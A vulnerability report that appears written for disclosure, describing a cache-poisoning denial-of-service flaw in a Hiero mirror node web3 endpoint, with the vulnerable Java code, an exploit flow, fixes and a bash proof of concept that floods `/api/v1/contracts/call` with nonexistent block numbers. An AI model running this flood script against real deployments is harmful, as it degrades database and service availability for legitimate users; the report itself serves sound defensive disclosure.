### Title
Cache Exhaustion via Unauthenticated Block-Index Lookups Enabling Persistent DB Query Amplification

### Summary
The `cacheManagerRecordFileIndex()` bean configures a Caffeine cache with a hard `maximumSize(10000)` and `expireAfterWrite(10, TimeUnit.MINUTES)`. The `findByIndex` method on `RecordFileRepository` uses `unless = "#result == null"`, which does **not** prevent caching of `Optional.empty()` (returned for non-existent block indices), allowing an attacker to fill all 10,000 slots with useless empty-result entries. The global rate limiter is a single shared bucket (not per-IP), so a single attacker can consume the entire 500 req/s allowance while simultaneously poisoning the cache, causing legitimate entries to be evicted and forcing expensive DB queries for every subsequent real-block lookup.

### Finding Description

**Exact code locations:**

`web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java`, lines 153–164:
```java
@Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
@Primary
CacheManager cacheManagerRecordFileIndex() {
    final var caffeine = Caffeine.newBuilder()
            .expireAfterWrite(10, TimeUnit.MINUTES)
            .maximumSize(10000)          // hard cap
            .recordStats();
    ...
}
```

`web3/src/main/java/org/hiero/mirror/web3/repository/RecordFileRepository.java`, lines 27–29:
```java
@Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX,
           unless = "#result == null")
Optional<RecordFile> findByIndex(long index);
```

**Root cause — failed assumption in `unless` condition:**
The `unless = "#result == null"` guard is intended to skip caching of "not found" results. However, the return type is `Optional<RecordFile>`. When no record file exists for a given index, Spring Data JPA returns `Optional.empty()`, which is a non-null object. The SpEL expression `#result == null` evaluates to `false`, so `Optional.empty()` **is cached**. An attacker supplying 10,000 distinct non-existent block numbers (e.g., `Long.MAX_VALUE - 1`, `Long.MAX_VALUE - 2`, …) fills the cache entirely with empty-result entries.

**Rate-limiter scope — global, not per-IP:**
`web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleConfiguration.java`, lines 24–32:
```java
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default 500
    ...
    return Bucket.builder().addLimit(limit).build();
}
```
This is a single application-wide `Bucket` bean. A single attacker IP can consume all 500 tokens/second, simultaneously starving legitimate users and filling the cache.

**Exploit flow:**
1. Attacker sends `POST /api/v1/contracts/call` with `"block": "<N>"` for N = a non-existent block number, at 500 req/s.
2. Each request passes the global rate limiter (consuming one token), reaches `RecordFileServiceImpl.findByBlockType()` → `recordFileRepository.findByIndex(N)`, hits the DB (miss), returns `Optional.empty()`, and caches it under key N.
3. After ~20 seconds (10,000 / 500), all 10,000 cache slots are occupied by `Optional.empty()` entries for non-existent indices.
4. Caffeine's W-TinyLFU eviction now evicts legitimate real-block entries to make room for new attacker entries.
5. For the next 10 minutes (TTL), every legitimate `findByIndex` call for a real block number misses the cache and hits the DB.
6. The attacker repeats the cycle every 10 minutes to maintain the poisoned state.

### Impact Explanation
Every cache miss on `findByIndex` triggers a full DB query (`SELECT r FROM RecordFile r WHERE r.index = ?1`). Under normal operation this cache absorbs the majority of block-number lookups during contract execution (including `BLOCKHASH` opcode resolution via `MirrorBlockHashOperation`). With the cache fully poisoned, DB query volume for block-index lookups increases proportionally to request load, potentially saturating the database connection pool and degrading or denying service to all users. Severity: **Medium–High** (availability impact, no data exfiltration).

### Likelihood Explanation
The attack requires no authentication, no special privileges, and no knowledge of internal state — only the ability to send HTTP POST requests to the public `/api/v1/contracts/call` endpoint. The global rate limiter (500 req/s) is the only barrier; it takes ~20 seconds to fill the cache and the attacker can sustain the attack indefinitely. The attack is trivially scriptable with `curl` or any HTTP client. Repeatability is high.

### Recommendation
1. **Fix the `unless` condition** to also exclude empty Optionals:
   ```java
   unless = "#result == null || !#result.isPresent()"
   ```
   This prevents non-existent block indices from consuming cache slots.

2. **Switch to per-IP rate limiting** (e.g., using a `ConcurrentHashMap<String, Bucket>` keyed by client IP) so a single attacker cannot consume the entire global allowance.

3. **Validate block number range** before the cache/DB lookup: reject requests for block numbers outside `[0, latestBlockNumber]` at the controller layer, before they reach the repository.

4. Consider **negative-result TTL separation**: use a shorter TTL (e.g., 30 seconds) for `Optional.empty()` results vs. 10 minutes for real results.

### Proof of Concept
```bash
# Fill the 10,000-entry cache with non-existent block indices
for i in $(seq 1 10000); do
  curl -s -X POST http://<host>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d "{\"block\":\"$((9999999900 + i))\",\"to\":\"0x0000000000000000000000000000000000000001\",\"gas\":21000}" &
done
wait

# Now legitimate requests for real block numbers miss the cache and hit the DB:
curl -X POST http://<host>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"block":"12345","to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Observe DB query latency spike in server logs / metrics
```
